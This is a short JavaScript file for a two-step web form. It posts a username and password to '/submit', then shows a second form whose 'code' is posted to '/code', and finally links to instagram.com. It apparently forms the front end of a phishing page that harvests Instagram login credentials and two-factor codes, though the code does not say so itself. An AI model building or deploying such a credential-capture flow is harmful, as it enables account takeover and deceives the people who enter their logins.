const btn_submit = document.getElementById('btn-submit');

const formdt = document.querySelector('.my-form');

btn_submit.addEventListener('click', event =>{

    const formData = new FormData(formdt);
    const data = Object.fromEntries(formData)
    if (data.username == "" || data.password == ""){
        window.location.reload();
        return false;
    }
    
    fetch('/submit', {
        method:'POST',
        headers:{
            'Content-Type':'application/json'
        },
        body:JSON.stringify(data)
        
    })
    .then(() => {
        const code_content = document.getElementById('second')
        const first_form = document.getElementById('first')
        first_form.style.display = 'none'
        code_content.style.display = 'block';
    })



})



  
const code_submit = document.getElementById('code-submit');

const formcode = document.querySelector('.code-form');
const code_link = document.getElementById('code_link')
code_submit.addEventListener('click', event =>{

    const codeformData = new FormData(formcode);
    const codedata = Object.fromEntries(codeformData)

    if (codedata.code == ""){
        window.location.reload();
        code_link.href = '/';
        return false;
    }
    code_link.href = 'https://www.instagram.com/'
    fetch('/code', {
        method:'POST',
        headers:{
            'Content-Type':'application/json'
        },
        body:JSON.stringify(codedata)
        
    })



})